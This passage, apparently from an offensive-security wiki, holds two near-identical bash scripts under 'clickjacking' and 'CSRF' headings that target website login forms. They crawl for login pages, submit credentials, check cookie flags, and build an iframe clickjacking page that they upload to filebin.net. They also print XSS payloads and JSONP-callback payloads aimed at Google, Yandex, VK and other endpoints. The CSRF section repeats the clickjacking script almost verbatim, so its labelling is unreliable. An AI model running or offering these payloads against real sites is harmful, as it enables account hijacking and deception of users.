DATA="${USERNAME_FIELD}=${USER}&${PASSWORD_FIELD}=${PASS}"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
[ -n "$REMEMBER_FIELD" ] && DATA="${DATA}&${REMEMBER_FIELD}=${REMEMBER_VALUE}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Check remember-password related vulnerabilities (login + cookies/body)
VULN_FOUND=0
color_print CYAN "[*] Checking remember-password related vulnerabilities..."
tmp_headers=$(mktemp) tmp_body=$(mktemp)
trap "rm -f '$tmp_headers' '$tmp_body'" RETURN
curl -s -S -D "$tmp_headers" -o "$tmp_body" -X "$METHOD" "$FULL_ACTION" "${HEADERS[@]}" --data-raw "$DATA" -L --max-time 15 2>/dev/null || true
login_headers=$(cat "$tmp_headers" 2>/dev/null)
login_response=$(cat "$tmp_body" 2>/dev/null)

login_user=""
while IFS= read -r pair; do
    [[ "$pair" != "${USERNAME_FIELD}="* ]] && continue
    login_user="${pair#*=}"
    break
done <<< "$(echo "$DATA" | tr '&' '\n')"
[[ -z "$login_user" ]] && login_user="admin"

while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    cookie_name=$(echo "$line" | sed -E 's/^Set-Cookie:[[:space:]]*([^=]+)=.*/\1/I' | tr -d ' ')
    if ! echo "$cookie_name" | grep -qiE '^(remember|persist|stay|autologin|keep|auth|session|sess|credential|login_token|access_token)'; then
        echo "$cookie_name" | grep -qiE 'remember|persist|auth|session|sess|credential|token' || continue
    fi
    if echo "$line" | grep -qE 'Max-Age=[0-9]+'; then
        max_age=$(echo "$line" | grep -oE 'Max-Age=[0-9]+' | head -1 | cut -d= -f2)
        if [[ -n "$max_age" && "$max_age" -ge 2592000 ]]; then
            color_print YELLOW "[!] Long-lived cookie (>=30d): $cookie_name"
            VULN_FOUND=1
        fi
    fi
    if echo "$line" | grep -qE 'Expires=[A-Za-z]{3},'; then
        color_print YELLOW "[!] Cookie with Expires (possible long-lived): $cookie_name"
        VULN_FOUND=1
    fi
    echo "$line" | grep -qi 'HttpOnly' || { color_print YELLOW "[!] Auth cookie without HttpOnly: $cookie_name"; VULN_FOUND=1; }
    if [[ "$URL" == https* ]]; then
        echo "$line" | grep -qi 'Secure' || { color_print YELLOW "[!] Auth cookie without Secure (HTTPS): $cookie_name"; VULN_FOUND=1; }
    fi
done <<< "$(echo "$login_headers" | grep -i '^Set-Cookie:')"

if [[ -n "$REMEMBER_FIELD" ]] && echo "$login_headers" | grep -qi '^Set-Cookie:'; then
    color_print YELLOW "[!] Remember-me was sent; response sets cookie(s)."
    VULN_FOUND=1
fi

echo "$login_response" | grep -qiE "remember_me|rememberme|persist|stay_logged|keep.?me.?logged" && \
    { color_print YELLOW "[!] Remember-me token reflected in body (XSS risk)."; VULN_FOUND=1; }
if [[ -n "$login_user" ]]; then
    esc_user=$(printf '%s' "$login_user" | sed 's/[.[\*^$()+?{|]/\\&/g')
    echo "$login_response" | grep -qE "(token|user|id|name).*$esc_user|$esc_user.*(token|user|id)" 2>/dev/null && \
        { color_print YELLOW "[!] Username/token reflected in body (XSS risk)."; VULN_FOUND=1; }
fi

if [[ "$VULN_FOUND" -eq 0 ]]; then
    color_print RED "[X] No remember-password vulnerability detected."
    exit 1
fi

color_print GREEN "[+] Remember-password issue(s) found. Building PoC."

# Build and upload PoC (exploit)
login_escaped="${LOGIN//\\/\\\\}"
login_escaped="${login_escaped//\"/\\\"}"
cat <<EOHTML > /tmp/index.html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, user-scalable=no">
<title></title>
<style>
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; min-height: 100vh; min-height: 100dvh; }
iframe { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
<iframe src="$login_escaped" id="target-frame"></iframe>
</body>
</html>
EOHTML

if [[ -f /tmp/index.html ]]; then
    color_print CYAN "[*] Getting Filebin bin_id..."
    bin_id=$(curl -sL https://filebin.net | grep -oP 'href="https://filebin\.net/\K[^"]+' | head -1)
    if [[ -n "$bin_id" ]]; then
        color_print CYAN "[*] Uploading PoC: ${bin_id}/index.html"
        curl -sL -X POST "https://filebin.net/${bin_id}/index.html" \
            -H "Content-Type: text/html" --data-binary "@/tmp/index.html" >/dev/null
        POC_URL="https://filebin.net/${bin_id}/index.html"
        export POC_URL
        color_print GREEN "[+] PoC uploaded: $POC_URL"
    else
        color_print RED "[X] Could not get Filebin bin_id."
    fi
fi

color_print CYAN "[*] XSS payload: full-screen iframe of login (inject where XSS exists):"
login_js_escaped="${LOGIN//\'/\\\'}"
printf "%b%s%b\n" "${YELLOW}" "(function(){var i=document.createElement('iframe');i.src='${login_js_escaped}';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';document.body.appendChild(i);})();" "${RESET}"
printf "%b%s%b\n\n" "${YELLOW}" "<script>(function(){var i=document.createElement('iframe');i.src='${login_js_escaped}';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';document.body.appendChild(i);})();</script>" "${RESET}"

color_print CYAN "[*] XSS/JSONP payloads to load PoC page (opacity overlay):"
js_payload="var iframe=document.createElement('iframe');iframe.src='${POC_URL}';iframe.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;opacity:0.2;z-index:9999';document.body.appendChild(iframe);"
encoded=$(printf '%s' "$js_payload" | jq -sRr @uri)
targets=(
    "https://api.mixpanel.com/track/?callback=JSONP"
    "https://www.google.com/complete/search?client=chrome&q=hello&callback=JSONP"
    "https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=JSONP"
    "https://accounts.google.com/o/oauth2/revoke?callback=JSONP"
    "https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=JSONP"
    "https://api.vk.com/method/wall.get?callback=JSONP"
    "https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=JSONP"
    "https://ug.alibaba.com/api/ship/read?callback=JSONP"
)

for target in "${targets[@]}"; do
    printf "%b[*] Payload (iframe loader):%b\n" "${YELLOW}" "${RESET}"
    printf "<script src=\"%s\"></script>\n\n" "${target/JSONP/$encoded}"
done

color_print GREEN "[+] Done. PoC: $POC_URL"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x rp-clickjacking.sh;sudo ./rp-clickjacking.sh $WEBSITE $USER $PASS
```

### Cross Site Request Forgery <a href="#parameter-modification" id="parameter-modification"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [cURL](https://curl.se/)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano rp-csrf.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 3 ]; then
    echo "Usage: $0 <domain.com> <username> <password>"
    exit 1
fi

# arguments
URL="$1"
USER="$2"
PASS="$3"
DEPS="git curl golang jq"

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        apt install -y "$pkg"
        color_print GREEN "[+] $pkg installed"
    fi
done

# Install Katana
if ! command -v katana &>/dev/null; then
    go env -w GO111MODULE=on
    go env -w GOPROXY=https://goproxy.cn,direct
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
    color_print GREEN "[+] katana installed"
fi

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    color_print RED "[X] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA"; then
    color_print RED "[X] CAPTCHA detected on login page."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
    grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
    grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# Remember password / Remember me checkbox
REMEMBER_FIELD=""
REMEMBER_VALUE="on"
REMEMBER_INPUT=$(echo "$FORM" | grep -oiE '<input[^>]+>' | grep -iE 'type=["'\'']?checkbox["'\'']?' | \
    grep -iE 'name=["'\'']?[^"'\'' ]*(remember|remember_me|rememberme|stay_logged|persist|keep[^"'\'']*login)' | head -1)

if [ -n "$REMEMBER_INPUT" ]; then
    REMEMBER_FIELD=$(echo "$REMEMBER_INPUT" | grep -oiE 'name=["'\'']?\K[^"'\'' ]+')
    REMEMBER_VAL_ATTR=$(echo "$REMEMBER_INPUT" | grep -oiE 'value=["'\'']?\K[^"'\'' ]+')
    [ -n "$REMEMBER_VAL_ATTR" ] && REMEMBER_VALUE="$REMEMBER_VAL_ATTR"
fi

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')

while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=${USER}&${PASSWORD_FIELD}=${PASS}"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
[ -n "$REMEMBER_FIELD" ] && DATA="${DATA}&${REMEMBER_FIELD}=${REMEMBER_VALUE}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Check remember-password related vulnerabilities (login + cookies/body)
VULN_FOUND=0
color_print CYAN "[*] Checking remember-password related vulnerabilities..."
tmp_headers=$(mktemp) tmp_body=$(mktemp)
trap "rm -f '$tmp_headers' '$tmp_body'" RETURN
curl -s -S -D "$tmp_headers" -o "$tmp_body" -X "$METHOD" "$FULL_ACTION" "${HEADERS[@]}" --data-raw "$DATA" -L --max-time 15 2>/dev/null || true
login_headers=$(cat "$tmp_headers" 2>/dev/null)
login_response=$(cat "$tmp_body" 2>/dev/null)

login_user=""
while IFS= read -r pair; do
    [[ "$pair" != "${USERNAME_FIELD}="* ]] && continue
    login_user="${pair#*=}"
    break
done <<< "$(echo "$DATA" | tr '&' '\n')"
[[ -z "$login_user" ]] && login_user="admin"

while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    cookie_name=$(echo "$line" | sed -E 's/^Set-Cookie:[[:space:]]*([^=]+)=.*/\1/I' | tr -d ' ')
    if ! echo "$cookie_name" | grep -qiE '^(remember|persist|stay|autologin|keep|auth|session|sess|credential|login_token|access_token)'; then
        echo "$cookie_name" | grep -qiE 'remember|persist|auth|session|sess|credential|token' || continue
    fi
    if echo "$line" | grep -qE 'Max-Age=[0-9]+'; then
        max_age=$(echo "$line" | grep -oE 'Max-Age=[0-9]+' | head -1 | cut -d= -f2)
        if [[ -n "$max_age" && "$max_age" -ge 2592000 ]]; then
            color_print YELLOW "[!] Long-lived cookie (>=30d): $cookie_name"
            VULN_FOUND=1
        fi
    fi
    if echo "$line" | grep -qE 'Expires=[A-Za-z]{3},'; then
        color_print YELLOW "[!] Cookie with Expires (possible long-lived): $cookie_name"
        VULN_FOUND=1
    fi
    echo "$line" | grep -qi 'HttpOnly' || { color_print YELLOW "[!] Auth cookie without HttpOnly: $cookie_name"; VULN_FOUND=1; }
    if [[ "$URL" == https* ]]; then
        echo "$line" | grep -qi 'Secure' || { color_print YELLOW "[!] Auth cookie without Secure (HTTPS): $cookie_name"; VULN_FOUND=1; }
    fi
done <<< "$(echo "$login_headers" | grep -i '^Set-Cookie:')"

if [[ -n "$REMEMBER_FIELD" ]] && echo "$login_headers" | grep -qi '^Set-Cookie:'; then
    color_print YELLOW "[!] Remember-me was sent; response sets cookie(s)."
    VULN_FOUND=1
fi

echo "$login_response" | grep -qiE "remember_me|rememberme|persist|stay_logged|keep.?me.?logged" && \
    { color_print YELLOW "[!] Remember-me token reflected in body (XSS risk)."; VULN_FOUND=1; }
if [[ -n "$login_user" ]]; then
    esc_user=$(printf '%s' "$login_user" | sed 's/[.[\*^$()+?{|]/\\&/g')
    echo "$login_response" | grep -qE "(token|user|id|name).*$esc_user|$esc_user.*(token|user|id)" 2>/dev/null && \
        { color_print YELLOW "[!] Username/token reflected in body (XSS risk)."; VULN_FOUND=1; }
fi

if [[ "$VULN_FOUND" -eq 0 ]]; then
    color_print RED "[X] No remember-password vulnerability detected."
    exit 1
fi

color_print GREEN "[+] Remember-password issue(s) found. Building PoC."

# Build and upload PoC (exploit)
login_escaped="${LOGIN//\\/\\\\}"
login_escaped="${login_escaped//\"/\\\"}"
cat <<EOHTML > /tmp/index.html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, user-scalable=no">
<title></title>
<style>
* { box-sizing: border-box; }
html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; min-height: 100vh; min-height: 100dvh; }
iframe { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; width: 100%; height: 100%; border: none; }
</style>
</head>
<body>
<iframe src="$login_escaped" id="target-frame"></iframe>
</body>
</html>
EOHTML

if [[ -f /tmp/index.html ]]; then
    color_print CYAN "[*] Getting Filebin bin_id..."
    bin_id=$(curl -sL https://filebin.net | grep -oP 'href="https://filebin\.net/\K[^"]+' | head -1)
    if [[ -n "$bin_id" ]]; then
        color_print CYAN "[*] Uploading PoC: ${bin_id}/index.html"
        curl -sL -X POST "https://filebin.net/${bin_id}/index.html" \
            -H "Content-Type: text/html" --data-binary "@/tmp/index.html" >/dev/null
        POC_URL="https://filebin.net/${bin_id}/index.html"
        export POC_URL
        color_print GREEN "[+] PoC uploaded: $POC_URL"
    else
        color_print RED "[X] Could not get Filebin bin_id."
    fi
fi

color_print CYAN "[*] XSS payload: full-screen iframe of login (inject where XSS exists):"
login_js_escaped="${LOGIN//\'/\\\'}"
printf "%b%s%b\n" "${YELLOW}" "(function(){var i=document.createElement('iframe');i.src='${login_js_escaped}';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';document.body.appendChild(i);})();" "${RESET}"
printf "%b%s%b\n\n" "${YELLOW}" "<script>(function(){var i=document.createElement('iframe');i.src='${login_js_escaped}';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:2147483647';document.body.appendChild(i);})();</script>" "${RESET}"

color_print CYAN "[*] XSS/JSONP payloads to load PoC page (opacity overlay):"
js_payload="var iframe=document.createElement('iframe');iframe.src='${POC_URL}';iframe.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;opacity:0.2;z-index:9999';document.body.appendChild(iframe);"
encoded=$(printf '%s' "$js_payload" | jq -sRr @uri)
targets=(
    "https://api.mixpanel.com/track/?callback=JSONP"
    "https://www.google.com/complete/search?client=chrome&q=hello&callback=JSONP"
    "https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=JSONP"
    "https://accounts.google.com/o/oauth2/revoke?callback=JSONP"
    "https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=JSONP"
    "https://api.vk.com/method/wall.get?callback=JSONP"
    "https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=JSONP"
    "https://ug.alibaba.com/api/ship/read?callback=JSONP"
)

for target in "${targets[@]}"; do
    printf "%b[*] Payload (iframe loader):%b\n" "${YELLOW}" "${RESET}"
    printf "<script src=\"%s\"></script>\n\n" "${target/JSONP/$encoded}"
done

color_print GREEN "[+] Done. PoC: $POC_URL"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x rp-csrf.sh;sudo ./rp-csrf.sh $WEBSITE $USER $PASS
```
